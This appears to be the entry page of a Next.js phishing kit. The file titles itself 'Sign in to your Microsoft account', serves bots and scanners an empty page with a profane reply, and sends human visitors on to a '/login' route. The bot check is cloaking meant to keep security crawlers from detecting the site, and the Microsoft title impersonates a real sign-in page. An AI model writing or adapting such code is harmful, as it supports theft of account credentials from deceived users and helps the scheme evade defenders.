import MobileDetect from "mobile-detect";
import type { NextPage } from "next";
import Head from "next/head";

const index: NextPage<{ isBot: boolean }> = ({ isBot }) => {
  if (isBot) {
    return <div />;
  }

  return (
    <>
      <Head>
        <link rel="shortcut icon" href="/favicon.ico" />
        <title>Sign in to your Microsoft account</title>
      </Head>
      <div />
    </>
  );
};

export const getServerSideProps = ({ res, req }: { res: any; req: any }) => {
  const md = new MobileDetect(req?.headers[`user-agent`] as string);
  const isBot = md.is(`Bot`);

  if (isBot) {
    res.end(`Fuck off`);
    return {
      props: { isBot },
    };
  }

  return {
    props: { isBot },
    redirect: {
      destination: "/login",
      permanent: false,
    },
  };
};

export default index;
